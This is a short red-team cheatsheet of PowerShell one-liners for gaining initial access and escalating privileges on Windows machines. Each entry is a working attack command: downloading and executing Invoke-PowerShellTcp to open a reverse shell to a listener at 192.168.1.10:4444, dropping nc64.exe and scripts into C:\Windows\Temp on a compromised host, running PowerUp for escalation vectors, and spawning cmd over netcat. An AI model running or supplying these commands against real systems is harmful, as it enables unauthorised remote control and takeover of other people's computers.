---
id: b50db440-24a5-403d-9135-a94c23f7471c
name: Red Team Initial Access & Privilege Escalation
type: cheatsheet
verified: false
created_at: '2020-07-15T19:05:45.645307+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Red Team Initial Access & Privilege Escalation

# Description

Red Team Cheatsheet to preform Initial Access & Privilege Escalation with powershell



**Command** ([[Powershell Reverse shell]]):

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/tools/ps/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.10 -Port 4444

```







**Command** ([[Download nc binary.]]):

```bash
Invoke-WebRequest "http://192.168.1.10:8080/tools/bin/nc64.exe" -OutFile "C:\Windows\Temp\nc64.exe"

```







**Command** ([[Download PowerUp and check for privilege escalation vectors]]):

```bash
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/PowerUp.ps1');Invoke-AllChecks

```







**Command** ([[Download and save file to compromised machine]]):

```bash
Invoke-WebRequest "http://192.168.1.10:8080/tools/ps/SomeBS.ps1" -OutFile "C:\Windows\Temp\SomeBS.ps1"

```







**Command** ([[Full path of 64 bit powershell binary to get a 64 bit reverseshell]]):

```powershell
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -C "C:\Windows\Temp\nc.exe -e cmd 192.168.1.10 4444"

```






